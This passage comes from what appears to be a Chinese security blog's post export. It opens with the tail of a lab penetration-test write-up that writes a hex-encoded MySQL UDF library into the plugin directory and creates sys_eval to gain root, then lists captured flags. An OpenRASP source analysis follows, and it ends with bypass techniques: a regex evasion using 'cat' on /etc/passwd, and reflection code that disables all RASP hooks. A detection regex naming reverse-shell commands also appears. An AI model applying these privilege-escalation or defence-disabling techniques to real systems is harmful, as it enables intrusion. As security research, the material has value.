2076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000011b033b980000001200000040fbffffb400000041fbffffcc00000042fbffffe400000043fbfffffc00000044fbffff1401000047fbffff2c01000048fbffff44010000e2fbffff6c010000cafcffffa4010000f3fcffffbc0100001cfdffffd401000086fdfffff4010000b6fdffff0c020000e3fdffff2c02000002feffff4402000016feffff5c02000084feffff7402000093feffff8c0200001400000000000000017a5200017810011b0c070890010000140000001c00000084faffff01000000000000000000000014000000340000006dfaffff010000000000000000000000140000004c00000056faffff01000000000000000000000014000000640000003ffaffff010000000000000000000000140000007c00000028faffff030000000000000000000000140000009400000013faffff01000000000000000000000024000000ac000000fcf9ffff9a00000000420e108c02480e18410e20440e3083048603000000000034000000d40000006efaffffe800000000420e10470e18420e208d048e038f02450e28410e30410e38830786068c05470e50000000000000140000000c0100001efbffff2900000000440e100000000014000000240100002ffbffff2900000000440e10000000001c0000003c01000040fbffff6a00000000410e108602440e188303470e200000140000005c0100008afbffff3000000000440e10000000001c00000074010000a2fbffff2d00000000420e108c024e0e188303470e2000001400000094010000affbffff1f00000000440e100000000014000000ac010000b6fbffff1400000000440e100000000014000000c4010000b2fbffff6e00000000440e300000000014000000dc01000008fcffff0f00000000000000000000001c000000f4010000fffbffff4100000000410e108602440e188303470e2000000000000000000000ffffffffffffffff0000000000000000ffffffffffffffff000000000000000000000000000000000100000000000000b2010000000000000c00000000000000a00b0000000000000d00000000000000781100000000000004000000000000005801000000000000f5feff6f00000000a00200000000000005000000000000006807000000000000060000000000000060030000000000000a00000000000000e0010000000000000b0000000000000018000000000000000300000000000000e81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200a0000000000000700000000000000c0090000000000000800000000000000600000000000000009000000000000001800000000000000feffff6f00000000a009000000000000ffffff6f000000000100000000000000f0ffff6f000000004809000000000000f9ffff6f0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000ce0b000000000000de0b000000000000ee0b000000000000fe0b0000000000000e0c0000000000001e0c0000000000002e0c0000000000003e0c0000000000004e0c0000000000005e0c0000000000006e0c0000000000007e0c0000000000008e0c0000000000009e0c000000000000ae0c000000000000be0c0000000000008017200000000000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000b000000f6ffff6f0200000000000000a002000000000000a002000000000000c000000000000000030000000000000008000000000000000000000000000000150000000b00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001d00000003000000020000000000000068070000000000006807000000000000e00100000000000000000000000000000100000000000000000000000000000025000000ffffff6f020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000feffff6f0200000000000000a009000000000000a009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000c009000000000000c00900000000000060000000000000000300000000000000080000000000000018000000000000004b000000040000000200000000000000200a000000000000200a0000000000008001000000000000030000000a0000000800000000000000180000000000000055000000010000000600000000000000a00b000000000000a00b000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000b80b000000000000b80b00000000000010010000000000000000000000000000040000000000000010000000000000005b000000010000000600000000000000d00c000000000000d00c000000000000a80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000e000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000dd000000000000000000000000000000010000000000000001000000000000006f000000010000000200000000000000641200000000000064120000000000009c000000000000000000000000000000040000000000000000000000000000007d000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008e000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009a000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000a3000000010000000300000000000000d016200000000000d0160000000000001800000000000000000000000000000008000000000000000800000000000000a8000000010000000300000000000000e816200000000000e8160000000000009800000000000000000000000000000008000000000000000800000000000000b1000000010000000300000000000000801720000000000080170000000000000800000000000000000000000000000008000000000000000000000000000000b7000000080000000300000000000000881720000000000088170000000000001000000000000000000000000000000008000000000000000000000000000000bc000000010000000000000000000000000000000000000088170000000000009b000000000000000000000000000000010000000000000000000000000000000100000003000000000000000000000000000000000000002318000000000000c500000000000000000000000000000001000000000000000000000000000000 INTO DUMPFILE &#x27;/usr/lib/mysql/plugin/udf_y4.so&#x27;; 之后创建一个用户自定义函数即可 1CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;udf_y4.so&#x27;; 成功获得root权限 flagflag1{b9bbcb33e11b80be759c4e844862482d} 首页service.html flag2{fc3fd58dcdad9ab23faca6e9a36e581c} /var/www/flag2.txt flag3{afc01ab56b50591e7dccf93122770cd2} 数据库 flag4{715dea6c055b9fe3337544932f2941ce} /root/flag4.txt","categories":[{"name":"PTES","slug":"PTES","permalink":"https://y4tacker.github.io/categories/PTES/"}],"tags":[{"name":"PTES","slug":"PTES","permalink":"https://y4tacker.github.io/tags/PTES/"}]},{"title":"OpenRasp分析","slug":"year/2022/5/OpenRasp分析","date":"2022-05-28T13:29:30.000Z","updated":"2024-08-04T09:01:49.370Z","comments":true,"path":"2022/05/28/year/2022/5/OpenRasp分析/","link":"","permalink":"https://y4tacker.github.io/2022/05/28/year/2022/5/OpenRasp%E5%88%86%E6%9E%90/","excerpt":"","text":"OpenRasp分析[TOC] 写在前面​ 花了点时间学习了下openrasp的核心代码，这里做下简单的分析 ​ 相关项目地址： ​ https://github.com/baidu-security/openrasp-v8 ​ https://github.com/baidu/openrasp ​ 这里我以目前官网最新版的1.3.7来做下分析，这里为了方便简单用springboot写个简单的控制器来进行调试分析即可，当然这里不会去看后端云控部分的代码，笔者只是想理清OpenRasp的逻辑 ​ 另外说点p话，顺便在这个过程当中被迫了解了点c++语法真是太妙了 一些日志说明OpenRasp的日志会通过文件的方式记录在对应文件夹下面，里面日志具体内容就不多解释了点开一眼就看得懂，了解下面几个关于日志目录介绍完全足够了 文件名 文件内容 plugin/plugin-DATE.log 检测插件的日志，e.g 插件异常、插件调试输出 rasp/rasp-DATE.log rasp agent 调试日志 alarm/alarm-DATE.log 攻击报警日志，JSON 格式，一行一个 policy_alarm/policy_alarm-DATE.log 安全基线检查报警日志，JSON 格式，一行一个 正文初始化首先既然是一个基于maven的项目，很多关键信息都肯定有定义的，类似premain-class以及Agent-class分别是启动时加载和启动后加载rasp，这里我们就以premain为例子，另一个差不多类似 首先是执行init初始化 初始化第一步JarFileHelper.addJarToBootstrap(inst);，可以看到这里其实就是把当前jar包也就是rasp.jar加载至Bootstrap类加载器，这里你可能想问为什么是最顶层的这个 为什么要将rasp.jar加载至Bootstrap类加载器通过JVM的api，把其路径追加到了启动类加载器的classpath中，这样，启动类加载器，收到类加载委派任务时，就能通过该classpath加载到rasp.jar的所有类了，根据双亲委派，意味着任何一个类加载器中的任何一个类，都能通过显式或者隐式加载，加载到rasp.jar中的类，反而网上说的啥无法hook到通过启动类加载器加载的类纯纯扯淡 配置初始化接下来的readVersion()方法，其实就是读取一些rasp自身的配置 1234567891011121314public static void readVersion() throws IOException &#123; Class clazz = Agent.class; String className = clazz.getSimpleName() + &quot;.class&quot;; String classPath = clazz.getResource(className).toString(); String manifestPath = classPath.substring(0, classPath.lastIndexOf(&quot;!&quot;) + 1) + &quot;/META-INF/MANIFEST.MF&quot;; Manifest manifest = new Manifest((new URL(manifestPath)).openStream()); Attributes attr = manifest.getMainAttributes(); projectVersion = attr.getValue(&quot;Project-Version&quot;); buildTime = attr.getValue(&quot;Build-Time&quot;); gitCommit = attr.getValue(&quot;Git-Commit&quot;); projectVersion = projectVersion == null ? &quot;UNKNOWN&quot; : projectVersion; buildTime = buildTime == null ? &quot;UNKNOWN&quot; : buildTime; gitCommit = gitCommit == null ? &quot;UNKNOWN&quot; : gitCommit;&#125; 没啥好看的，看看MANIFEST.MF就好 接下来执行ModuleLoader.load(mode, action, inst);来 ModuleLoader类初始化首先ModueLoader有个静态块，来看看代码做了两件事，一个是获取rasp.jar的绝对路径，另一个是获取拓展类加载器赋值给moduleClassLoader，至于为什么需要获取拓展类加载器，这里引入三梦师傅的话，很好理解没啥难度 1其实，很多时候，比如tomcat，它在运行中，大部分类都是由实现的应用类加载器进行加载的，那么，假如Engine是通过某个应用类加载器进行加载的，而我们的hook代码，在tomcat中应用类加载器加载的某个类，插入了某段代码，这段代码直接（com.xxx.A.a();）调用了Engine的某个类的方法，那么，按照双亲委派机制，以及隐式加载的规范，将会抛出ClassNoFoundError的错误 再简单看看代码，待会儿说说这个moduleClassLoader的作用，在很后面这里先了解了解 123456789101112131415161718192021222324252627282930static &#123; Class clazz; try &#123; clazz = Class.forName(&quot;java.nio.file.FileSystems&quot;); clazz.getMethod(&quot;getDefault&quot;).invoke((Object)null); &#125; catch (Throwable var4) &#123; &#125; clazz = ModuleLoader.class; String path = clazz.getResource(&quot;/&quot; + clazz.getName().replace(&quot;.&quot;, &quot;/&quot;) + &quot;.class&quot;).getPath(); if (path.startsWith(&quot;file:&quot;)) &#123; path = path.substring(5); &#125; if (path.contains(&quot;!&quot;)) &#123; path = path.substring(0, path.indexOf(&quot;!&quot;)); &#125; try &#123; baseDirectory = URLDecoder.decode((new File(path)).getParent(), &quot;UTF-8&quot;); &#125; catch (UnsupportedEncodingException var3) &#123; baseDirectory = (new File(path)).getParent(); &#125; ClassLoader systemClassLoader; for(systemClassLoader = ClassLoader.getSystemClassLoader(); systemClassLoader.getParent() != null &amp;&amp; !systemClassLoader.getClass().getName().equals(&quot;sun.misc.Launcher$ExtClassLoader&quot;); systemClassLoader = systemClassLoader.getParent()) &#123; &#125; moduleClassLoader = systemClassLoader; &#125; 接下来进入构造函数，首先实例化赋值engineContainer = new ModuleContainer(&quot;rasp-engine.jar&quot;); 引擎启动JS初始化在com.baidu.openrasp.EngineBoot#start中首先通过Loader.load();引入动态链接库，具体引入的是干嘛的之后就知道了，之后我们暂时先忽略配置相关的东西进入主要的 首先是JS的初始化 在这个过程，首先是设置日志输出相关 紧接着是设置StackGetter，这其实是一个回掉函数的触发 这一点可以从v8的文档得以验证，后面还会提到这里只是简单提提 紧接着是下面两行 12UpdatePlugin();InitFileWatcher(); 一个UpdatePlugin();，首先遍历plugins目录下的js文件，并添加到scripts变量当中 紧接着执行UpdatePlugin(List&lt;String[]&gt; scripts)，首先是CreateSnapshot从名字可以看出是创建快照，我们还是来具体看看干了些啥 简单对文件做了注释，因为流程确实没啥好说的 1234567891011121314151617181920212223242526272829303132333435363738394041424344/* * Class: com_baidu_openrasp_v8_V8 * Method: CreateSnapshot * Signature: (Ljava/lang/String;[Ljava/lang/Object;Ljava/lang/String;)Z */ALIGN_FUNCTION JNIEXPORT jboolean JNICALL Java_com_baidu_openrasp_v8_V8_CreateSnapshot(JNIEnv* env, jclass cls, jstring jconfig, jobjectArray jplugins, jstring jversion) &#123; //global.checkPoints auto config = Jstring2String(env, jconfig); //RASP版本信息 auto version = Jstring2String(env, jversion); std::vector&lt;PluginFile&gt; plugin_list; const size_t plugin_len = env-&gt;GetArrayLength(jplugins); //遍历plugin，并将插件文件名与插件内容保存到plugin_list里面 for (int i = 0; i &lt; plugin_len; i++) &#123; jobjectArray plugin = (jobjectArray)env-&gt;GetObjectArrayElement(jplugins, i); if (plugin == nullptr) &#123; continue; &#125; jstring jname = (jstring)env-&gt;GetObjectArrayElement(plugin, 0); jstring jsource = (jstring)env-&gt;GetObjectArrayElement(plugin, 1); if (jname == nullptr || jsource == nullptr) &#123; continue; &#125; auto name = Jstring2String(env, jname); auto source = Jstring2String(env, jsource); plugin_list.emplace_back(name, source); &#125; auto duration = std::chrono::system_clock::now().time_since_epoch(); auto millis = std::chrono::duration_cast&lt;std::chrono::milliseconds&gt;(duration).count(); //好了注释到上面这一坨就结束了 Snapshot* blob = new Snapshot(config, plugin_list, version, millis, env); if (!blob-&gt;IsOk()) &#123; delete blob; return false; &#125; std::lock_guard&lt;std::mutex&gt; lock(snapshot_mtx); delete snapshot; snapshot = blob; return true;&#125; 接下来是一个非常有意思的函数Snapshot，它的作用是创建一个构造好的js运行环境的快照，它继承了StartupData类，下面是我简单做的一些笔记 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374Snapshot::Snapshot(const std::string&amp; config, const std::vector&lt;PluginFile&gt;&amp; plugin_list, const std::string&amp; version, uint64_t timestamp, void* custom_data) : v8::StartupData(&#123;nullptr, 0&#125;), timestamp(timestamp) &#123; IsolateData data; data.custom_data = custom_data; v8::SnapshotCreator creator(external_references); //获取一个隔离的环境 Isolate* isolate = reinterpret_cast&lt;Isolate*&gt;(creator.GetIsolate()); //void * 则不同，任何类型的指针都可以直接赋值给它，无需进行强制类型转换 //上面这个custom_data从传递来看，传递过来的其实是JNIENV的指向 isolate-&gt;SetData(&amp;data); &#123; v8::Isolate::Scope isolate_scope(isolate); v8::HandleScope handle_scope(isolate); v8::Local&lt;v8::Context&gt; context = v8::Context::New(isolate); v8::Context::Scope context_scope(context); v8::TryCatch try_catch(isolate); v8::Local&lt;v8::Object&gt; global = context-&gt;Global(); //上下文当中设置version/global/window等信息 global-&gt;Set(context, NewV8Key(isolate, &quot;version&quot;), NewV8String(isolate, version)).IsJust(); global-&gt;Set(context, NewV8Key(isolate, &quot;global&quot;), global).IsJust(); global-&gt;Set(context, NewV8Key(isolate, &quot;window&quot;), global).IsJust(); v8::Local&lt;v8::Object&gt; v8_stdout = v8::Object::New(isolate); //下面都是绑定函数，比如将write绑定到函数external_references[0]的指向(这变量是啥后面会说到)，其他类似，另外还有绑定标准输出与标准错误 v8_stdout -&gt;Set( context, NewV8Key(isolate, &quot;write&quot;), v8::Function::New(context, reinterpret_cast&lt;v8::FunctionCallback&gt;(external_references[0])).ToLocalChecked()) .IsJust(); global-&gt;Set(context, NewV8Key(isolate, &quot;stdout&quot;), v8_stdout).IsJust(); global-&gt;Set(context, NewV8Key(isolate, &quot;stderr&quot;), v8_stdout).IsJust(); global -&gt;Set( context, NewV8Key(isolate, &quot;flex_tokenize&quot;), v8::Function::New(context, reinterpret_cast&lt;v8::FunctionCallback&gt;(external_references[1])).ToLocalChecked()) .IsJust(); global -&gt;Set( context, NewV8Key(isolate, &quot;request&quot;), v8::Function::New(context, reinterpret_cast&lt;v8::FunctionCallback&gt;(external_references[2])).ToLocalChecked()) .IsJust(); global -&gt;Set( context, NewV8Key(isolate, &quot;request_async&quot;), v8::Function::New(context, reinterpret_cast&lt;v8::FunctionCallback&gt;(external_references[3])).ToLocalChecked()) .IsJust(); //暂时不知道干嘛的，也没有这个js文件 if (isolate-&gt;ExecScript(&#123;reinterpret_cast&lt;const char*&gt;(gen_builtins), gen_builtins_len&#125;, &quot;builtins.js&quot;).IsEmpty()) &#123; Exception e(isolate, try_catch); Platform::logger(e); // no need to continue return; &#125; //初始化配置 if (isolate-&gt;ExecScript(config, &quot;config.js&quot;).IsEmpty()) &#123; Exception e(isolate, try_catch); Platform::logger(e); &#125; //执行我们的插件js脚本做参数初始化以及各种检测函数的注册 for (auto&amp; plugin_src : plugin_list) &#123; if (isolate-&gt;ExecScript(&quot;(function()&#123;\\n&quot; + plugin_src.source + &quot;\\n&#125;)()&quot;, plugin_src.filename, -1).IsEmpty()) &#123; Exception e(isolate, try_catch); Platform::logger(e); &#125; &#125; creator.SetDefaultContext(context); &#125; v8::StartupData snapshot = creator.CreateBlob(v8::SnapshotCreator::FunctionCodeHandling::kClear); this-&gt;data = snapshot.data; this-&gt;raw_size = snapshot.raw_size;&#125; 另外上面提到的external_references里面的回掉函数在native-function.cc当中有定义，这里直接放过来很好理解就不做解释了，稍微占点篇幅了 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#include &quot;bundle.h&quot;#include &quot;flex/flex.h&quot;#include &quot;request.h&quot;namespace openrasp_v8 &#123;void log_callback(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info) &#123; Isolate* isolate = reinterpret_cast&lt;Isolate*&gt;(info.GetIsolate()); for (int i = 0; i &lt; info.Length(); i++) &#123; v8::String::Utf8Value message(isolate, info[i]); Platform::logger(&#123;*message, static_cast&lt;size_t&gt;(message.length())&#125;); &#125;&#125;void flex_callback(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info) &#123; Isolate* isolate = reinterpret_cast&lt;Isolate*&gt;(info.GetIsolate()); auto context = isolate-&gt;GetCurrentContext(); if (info.Length() &lt; 2 || !info[0]-&gt;IsString() || !info[1]-&gt;IsString()) &#123; return; &#125; v8::String::Utf8Value str(isolate, info[0]); v8::String::Utf8Value lexer_mode(isolate, info[1]); char* input = *str; int input_len = str.length(); flex_token_result token_result = flex_lexing(input, input_len, *lexer_mode); size_t len = std::min(uint32_t(input_len), token_result.result_len); auto arr = v8::Array::New(isolate, len); for (int i = 0; i &lt; len; i++) &#123; arr-&gt;Set(context, i, v8::Integer::New(isolate, token_result.result[i])).IsJust(); &#125; free(token_result.result); info.GetReturnValue().Set(arr);&#125;void request_callback(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info) &#123; auto isolate = info.GetIsolate(); v8::TryCatch try_catch(isolate); auto context = isolate-&gt;GetCurrentContext(); v8::Local&lt;v8::Promise::Resolver&gt; resolver; if (!v8::Promise::Resolver::New(context).ToLocal(&amp;resolver)) &#123; try_catch.ReThrow(); return; &#125; info.GetReturnValue().Set(resolver-&gt;GetPromise()); HTTPRequest req(isolate, info[0]); HTTPResponse res = req.GetResponse(); auto object = res.ToObject(isolate); if (res.error) &#123; resolver-&gt;Reject(context, object).IsJust(); &#125; else &#123; resolver-&gt;Resolve(context, object).IsJust(); &#125;&#125;void request_async_callback(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info) &#123; auto isolate = info.GetIsolate(); AsyncRequest::GetInstance().Submit(std::make_shared&lt;HTTPRequest&gt;(isolate, info[0]));&#125;intptr_t* Snapshot::external_references = new intptr_t[5]&#123; reinterpret_cast&lt;intptr_t&gt;(log_callback), reinterpret_cast&lt;intptr_t&gt;(flex_callback), reinterpret_cast&lt;intptr_t&gt;(request_callback), reinterpret_cast&lt;intptr_t&gt;(request_async_callback), 0,&#125;;&#125; // namespace openrasp_v8 理解了这一段以后接下来再次回到Java端 这里获得RASP.algorithmConfig并保存到ConfigItem.ALGORITHM_CONFIG 到这里插件更新部分就结束了 之后调用了InitFileWatcher,它的作用是创建以目录为单位的文件监听，如果文件进行增删改，就执行插件更新 Checker的初始化接下来就是Checker的初始化 这里会遍历 遍历Type这个枚举类型将检测类型以及对应的检测函数添加到checkers这个EnumMap当中 CustomClassTransformer继续回来接下来调用this.initTransformer(inst);，这里实例化CustomClassTransformer这个 Class 文件的转换器， 可以看到将自身作为类转换器进行添加 12345public CustomClassTransformer(Instrumentation inst) &#123; this.inst = inst; inst.addTransformer(this, true); this.addAnnotationHook();&#125; 并调用retransform，这里逻辑很简单就不多说，看不懂的可以自行学习JavaAgent 123456789101112131415161718public void retransform() &#123; new LinkedList(); Class[] loadedClasses = this.inst.getAllLoadedClasses(); Class[] arr$ = loadedClasses; int len$ = loadedClasses.length; for(int i$ = 0; i$ &lt; len$; ++i$) &#123; Class clazz = arr$[i$]; if (this.isClassMatched(clazz.getName().replace(&quot;.&quot;, &quot;/&quot;)) &amp;&amp; this.inst.isModifiableClass(clazz) &amp;&amp; !clazz.getName().startsWith(&quot;java.lang.invoke.LambdaForm&quot;)) &#123; try &#123; this.inst.retransformClasses(new Class[]&#123;clazz&#125;); &#125; catch (Throwable var8) &#123; LogTool.error(ErrorType.HOOK_ERROR, &quot;failed to retransform class &quot; + clazz.getName() + &quot;: &quot; + var8.getMessage(), var8); &#125; &#125; &#125; &#125; 因此之后当类加载的时候，会进入我们自己的 Transformer 中，执行 transform函数进行拦截 Hook因此接下来我们着重看com.baidu.openrasp.transformer.CustomClassTransformer#transform方法，它会遍历hooks，如果条件符合(isClassMatched返回true)则会在制定的类方法当中进行hook 而这些类来源于哪里呢？就是open.baidu.openrasp.hook文件夹下的类 这里呢我们就随便挑一个来进行解读，那就来一个com.baidu.openrasp.hook.system.ProcessBuilderHook命令执行的类的吧，可以看到isClassMatched的规则 123456789public boolean isClassMatched(String className) &#123; if (ModuleLoader.isModularityJdk()) &#123; return &quot;java/lang/ProcessImpl&quot;.equals(className); &#125; else if (!OSUtil.isLinux() &amp;&amp; !OSUtil.isMacOS()) &#123; return OSUtil.isWindows() ? &quot;java/lang/ProcessImpl&quot;.equals(className) : false; &#125; else &#123; return &quot;java/lang/UNIXProcess&quot;.equals(className); &#125;&#125; 看看调用到底是如何调用的，我们回到com.baidu.openrasp.transformer.CustomClassTransformer#transform，可以看到最终返回的字节码是受hook.transformClass处理的，在这里还有个小细节是如果loader为null，则会调用setLoadedByBootstrapLoader设置其中属性为true，我们也知道什么情况下获取不到类加载器也就是由BootStrap启动器类加载器加载的一些类如File、Runtime等等，在设置为true以后在后面hook的时候生成代码有部分区别，之后会提到 我们可以看到com.baidu.openrasp.hook.AbstractClassHook#transformClass，它会调用具体实现类的hookMethod方法 这里也就是对应com.baidu.openrasp.hook.system.ProcessBuilderHook#hookMethod，可以看到这里的处理也是很全面的挺好 12345678910111213141516protected void hookMethod(CtClass ctClass) throws IOException, CannotCompileException, NotFoundException &#123; String src; if (ctClass.getName().contains(&quot;ProcessImpl&quot;)) &#123; if (OSUtil.isWindows()) &#123; src = this.getInvokeStaticSrc(ProcessBuilderHook.class, &quot;checkCommand&quot;, &quot;$1,$2&quot;, new Class[]&#123;String[].class, String.class&#125;); this.insertBefore(ctClass, &quot;&lt;init&gt;&quot;, (String)null, src); &#125; else if (ModuleLoader.isModularityJdk()) &#123; src = this.getInvokeStaticSrc(ProcessBuilderHook.class, &quot;checkCommand&quot;, &quot;$1,$2,$4&quot;, new Class[]&#123;byte[].class, byte[].class, byte[].class&#125;); this.insertBefore(ctClass, &quot;&lt;init&gt;&quot;, (String)null, src); &#125; &#125; else if (ctClass.getName().contains(&quot;UNIXProcess&quot;)) &#123; src = this.getInvokeStaticSrc(ProcessBuilderHook.class, &quot;checkCommand&quot;, &quot;$1,$2,$4&quot;, new Class[]&#123;byte[].class, byte[].class, byte[].class&#125;); this.insertBefore(ctClass, &quot;&lt;init&gt;&quot;, (String)null, src); &#125;&#125; 在具体要hook的类方法前面加上checkCommand这个函数 回答上面遗留的ModuleClassloader的问题在这里通过getInvokeStaticSrc这个方法生成具体插入的类，在这个方法当中可以看到，对于被BootStrap加载的类，它会通过com.baidu.openrasp.ModuleLoader.moduleClassLoader.loadClass去调用检查命令的checkCommand函数，这样就避免了由于双亲委派机制导致的ClassNotFoundException 由于重载思想差不多就随便挑一个看看 1234567891011121314151617181920212223242526272829303132333435363738394041public static void checkCommand(byte[] command, byte[] args, byte[] envBlock) &#123; if ((Boolean)HookHandler.enableCmdHook.get()) &#123; LinkedList&lt;String&gt; commands = new LinkedList(); //执行的命令 if (command != null &amp;&amp; command.length &gt; 0) &#123; commands.add(new String(command, 0, command.length - 1)); &#125; //执行的命令的参数 int index; if (args != null &amp;&amp; args.length &gt; 0) &#123; int position = 0; for(index = 0; index &lt; args.length; ++index) &#123; if (args[index] == 0) &#123; commands.add(new String(Arrays.copyOfRange(args, position, index))); position = index + 1; &#125; &#125; &#125; //来自envp参数，通常为空，通常是自己设置的环境变量 LinkedList&lt;String&gt; envList = new LinkedList(); if (envBlock != null) &#123; index = -1; for(int i = 0; i &lt; envBlock.length; ++i) &#123; if (envBlock[i] == 0) &#123; String envItem = new String(envBlock, index + 1, i - index - 1); if (envItem.length() &gt; 0) &#123; envList.add(envItem); &#125; index = i; &#125; &#125; &#125; checkCommand((List)commands, (List)envList); &#125; &#125; 之后在讲命令和环境变量放到commands与envList当中并执行checkCommand((List)commands, (List)envList);，这里会把执行的命令、环境变量、以及当前调用栈存放到params这个变量当中 之后带着这些参数执行HookHandler.doCheckWithoutRequest,这里省略一些废话 之后在com.baidu.openrasp.HookHandler#doRealCheckWithoutRequest 会选择合适的checker去检查我们执行的东西 123public static boolean check(Type type, CheckParameter parameter) &#123; return ((Checker)checkers.get(type)).check(parameter);&#125; 继续省略一堆废话，最终会调用到V8.check 我们来看看对应的c源码，这里忽略前面部分，后面这里有个比较骚的v8的函数SetLazyDataProperty 函数对应的Getter是GetStack，可以看到这个函数里面比较核心的操作就是通过JNIENV去调用Java的com.baidu.openrasp.v8.V8#GetStack函数很骚 123456789101112131415161718void GetStack(v8::Local&lt;v8::Name&gt; name, const v8::PropertyCallbackInfo&lt;v8::Value&gt;&amp; info) &#123; auto isolate = reinterpret_cast&lt;openrasp_v8::Isolate*&gt;(info.GetIsolate()); auto env = GetJNIEnv(isolate); jbyteArray jbuf = reinterpret_cast&lt;jbyteArray&gt;(env-&gt;CallStaticObjectMethod(v8_class.cls, v8_class.GetStack)); if (jbuf == nullptr) &#123; return info.GetReturnValue().Set(v8::Array::New(isolate)); &#125; auto maybe_string = v8::String::NewExternalOneByte(isolate, new ExternalOneByteStringResource(env, jbuf)); if (maybe_string.IsEmpty()) &#123; return info.GetReturnValue().Set(v8::Array::New(isolate)); &#125; auto maybe_value = v8::JSON::Parse(isolate-&gt;GetCurrentContext(), maybe_string.ToLocalChecked()); if (maybe_value.IsEmpty()) &#123; return info.GetReturnValue().Set(v8::Array::New(isolate)); &#125; auto value = maybe_value.ToLocalChecked(); info.GetReturnValue().Set(value);&#125; 继续往下看check函数，由于我们这里分析的是command，所以if部分暂时不用看，之后调用isolate-&gt;Check去执行检测(不截图了，简单来说就是找到对应的注册的检测函数去调用) 如何绕过绕过的方式其实真的有很多，这里简单谈几个 基于正则的绕过首先对于规则的检测既然是基于正则表达式，那么很显然如果在规则不够完善的情况之下，那也是可以造成一部分的绕过，比如我们可以看到在官方的插件当中，我们就拿这第一个查看文件的命令来说只是任意匹配1-5位，虽然不能通过多个空格之类的绕过 12345command_common: &#123; name: &#x27;算法3 - 识别常用渗透命令（探针）&#x27;, action: &#x27;log&#x27;, pattern: &#x27;cat.&#123;1,5&#125;/etc/passwd|nc.&#123;1,30&#125;-e.&#123;1,100&#125;/bin/(?:ba)?sh|bash\\\\s-.&#123;0,4&#125;i.&#123;1,20&#125;/dev/tcp/|subprocess.call\\\\(.&#123;0,6&#125;/bin/(?:ba)?sh|fsockopen\\\\(.&#123;1,50&#125;/bin/(?:ba)?sh|perl.&#123;1,80&#125;socket.&#123;1,120&#125;open.&#123;1,80&#125;exec\\\\(.&#123;1,5&#125;/bin/(?:ba)?sh&#x27;&#125;, 我们的cat函数支持同时读多个文件cat /abc/def /etc/passwd，这样也是可以轻轻松松得以进行绕过 通过修改某些属性通常如果存在反序列化漏洞，我们通常可以通过TemplatesImpl去加载任意字节码，在这里如果对于在RASP执行检测过程当中如果存在某些关键配置我们可以操控，那么就可以导致绕过，而OpenRasp里面就有，比如在执行检测前中间的调用流程有个com.baidu.openrasp.HookHandler#doCheckWithoutRequest，这里面提到了如果服务器的cpu使用率超过90%，禁用全部hook点 又或者满足当云控注册成功之前，不进入任何hook点，反正这些我们不都是可以通过反射去设置的么，这里我就随便来一个，就以第一个为例子吧，我们可以通过反射获取这个已经实例化的实例，在这个基础上修改disableHooks这个属性即可 代码示例如下 123456789try &#123; Class&lt;?&gt; clz = Thread.currentThread().getContextClassLoader().loadClass(&quot;com.baidu.openrasp.config.Config&quot;); java.lang.reflect.Method getConfig = clz.getDeclaredMethod(&quot;getConfig&quot;); java.lang.reflect.Field disableHooks = clz.getDeclaredField(&quot;disableHooks&quot;); disableHooks.setAccessible(true); Object ins = getConfig.invoke(null); disableHooks.set(ins,true);&#125; catch (Exception e) &#123;&#125; 为了得到直观的效果我把插件当中的log改为block来演示下 12345// 命令注入 - 常见命令command_common: &#123; name: &#x27;算法3 - 识别常用渗透命令（探针）&#x27;, action: &#x27;block&#x27;, pattern: &#x27;cat.&#123;1,5&#125;/etc/passwd|nc.&#123;1,30&#125;-e.&#123;1,100&#125;/bin/(?:ba)?sh|bash\\\\s-.&#123;0,4&#125;i.&#123;1,20&#125;/dev/tcp/|subprocess.call\\\\(.&#123;0,6&#125;/bin/(?:ba)?sh|fsockopen\\\\(.&#123;1,50&#125;/bin/(?:ba)?sh|perl.&#123;1,80&#125;socket.&#123;1,120&#125;open.&#123;1,80&#125;exec\\\\(.&#123;1,5&#125;/bin/(?:ba)?sh|\\\\&#123;echo,.&#123;10,400&#125;&#123;base64,-d&#125;&#x27;&#125; 并简单写了个控制器模拟反序列化过程（一个字懒） 123456789101112@RequestMapping(&quot;/off&quot;)public void off()&#123; try &#123; Class&lt;?&gt; clz = 